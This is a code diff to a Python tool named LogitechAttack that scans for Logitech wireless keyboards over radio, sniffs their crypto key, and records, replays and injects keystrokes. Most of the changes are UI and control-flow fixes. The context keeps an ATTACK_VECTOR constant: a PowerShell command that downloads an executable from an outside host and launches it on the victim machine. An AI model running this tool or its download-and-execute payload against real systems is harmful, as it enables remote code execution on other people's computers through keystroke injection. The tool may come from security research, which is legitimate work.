@@ -45,13 +45,16 @@ from sys import exit
 # constants
 ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
 
+# THESE MAP TO THE BUTTONS YOU SHOULD PRESS WHILE INTERACTING WITH THE UI
+# NOTE THAT THERE IS NO "IDLE" BUTTON. "IDLE" state happens when a mode is completed.
 RECORD_BUTTON   = pygame.K_1                # record button
 REPLAY_BUTTON   = pygame.K_2                # replay button
 ATTACK_BUTTON   = pygame.K_3                # attack button
 SCAN_BUTTON     = pygame.K_4                # scan button
 
+#THESE ARE INTERNAL STATE, NOT the buttons to press
 IDLE            = 0                         # idle state
-RECORD          = 1                         # record state
+RECORD          = 1                         # record state; Pressing 1 while in RECORD mode will toggle record mode off
 REPLAY          = 2                         # replay state
 SCAN            = 3                         # scan state
 ATTACK          = 4                         # attack state
@@ -92,6 +95,7 @@ class LogitechAttack():
             self.font = pygame.font.SysFont("arial", 24)
 #            self.screen.fill((255, 255, 255))
             self.screen.blit(self.bg, (0, 0))
+            self.showInstructions()
             pygame.display.update()
 
             # set key repetition parameters
@@ -104,10 +108,14 @@ class LogitechAttack():
             self.radio.enable_lna()
 
             # start scanning mode
-            self.setState(SCAN)
+            self.setState(IDLE)
         except:
             # info output
             info("[-] Error: Could not initialize Logitech Attack")
+
+
+    def showStatus(self, text, x = 30, y = 100):
+        self.showText(text, x, y)
 
 
     def showText(self, text, x = 40, y = 140):
@@ -115,9 +123,21 @@ class LogitechAttack():
         self.screen.blit(output, (x, y))
 
 
+    def showInstructions(self):
+        self.font = pygame.font.SysFont("arial", 16)
+        self.showText("Press 1 for RECORD", 30, 180)
+        self.showText("Press 2 for REPLAY", 30, 200)
+        self.showText("Press 3 for ATTACK", 30, 220)
+        self.showText("Press 4 for SCAN", 30, 240)
+        self.font = pygame.font.SysFont("arial", 24)
+
+    def checkForEscape(self):
+        event = pygame.event.poll()
+        return event.type == KEYDOWN and event.key == K_ESCAPE
+
+
     def setState(self, newState):
         """Set state"""
-
         if newState == RECORD:
             # set RECORD state
             self.state = RECORD
@@ -137,7 +157,7 @@ class LogitechAttack():
         else:
             # set IDLE state
             self.state = IDLE
-            self.statusText = "IDLING"
+            self.statusText = "IDLE"
 
 
     def unique_everseen(self, seq):
@@ -156,8 +176,12 @@ class LogitechAttack():
                     running = False
 
                 elif i.type == KEYDOWN:
+                    info(i)
                     if i.key == K_ESCAPE:
-                        running = False
+                        if self.state == IDLE:
+                            running = False
+                        else:
+                            self.setState(IDLE)
 
                     # record button state transitions
                     if i.key == RECORD_BUTTON:
@@ -198,7 +222,8 @@ class LogitechAttack():
             # show current status on screen
 #            self.screen.fill((255, 255, 255))
             self.screen.blit(self.bg, (0, 0))
-            self.showText(self.statusText)
+            self.showStatus(self.statusText)
+            self.showInstructions()
 
             # update the display
             pygame.display.update()
@@ -254,7 +279,12 @@ class LogitechAttack():
                 # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                 last_tune = time()
                 channel_index = 0
+                # Clear out any lingering button presses from earlier stages in the workflow
+                pygame.event.clear()
+                address = payload = None
                 while True:
+                    if self.checkForEscape():
+                        break
                     # increment the channel
                     if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                         channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
@@ -272,7 +302,11 @@ class LogitechAttack():
                         self.address = converted_address
                         break
 
-                self.showText("Found keyboard")
+                if not address:
+                    # go back to idle state and back to the original entrypoint
+                    self.setState(IDLE)
+                    continue
+                self.showStatus("Found keyboard")
                 address_string = ':'.join('{:02X}'.format(b) for b in address)
                 self.showText(address_string)
 
@@ -283,16 +317,24 @@ class LogitechAttack():
                 self.radio.enter_sniffer_mode(self.address)
 
                 info("Searching crypto key")
-                self.statusText = "SEARCHING"
+                self.statusText = "SEARCH4CRYPTO"
                 self.screen.blit(self.bg, (0, 0))
-                self.showText(self.statusText)
+                self.showStatus(self.statusText, x=20)
+                self.showInstructions()
 
                 # update the display
                 pygame.display.update()
 
                 last_key = 0
                 packet_count = 0
+                crypto_payload = None
+
+                # Clear out any lingering button presses from earlier stages in the workflow
+                pygame.event.clear()
                 while True:
+                    if self.checkForEscape():
+                        break
+
                     # receive payload
                     value = self.radio.receive_payload()
 
@@ -317,14 +359,15 @@ class LogitechAttack():
                     if packet_count >= 2 and time() - last_key > SCAN_TIME:
                         break
 
-                self.showText(u"Got crypto key!")
+                if crypto_payload:
+                    self.showText(u"Got crypto key!")
 
-                # info output
-                info('Got crypto key!')
+                    # info output
+                    info('Got crypto key!')
 
-                # initialize keyboard
-                self.kbd = keyboard.LogitechKeyboard(crypto_payload.tostring())
-                info('Initialize keyboard')
+                    # initialize keyboard
+                    self.kbd = keyboard.LogitechKeyboard(crypto_payload.tostring())
+                    info('Initialize keyboard')
 
                 # set IDLE state after scanning
                 self.setState(IDLE)
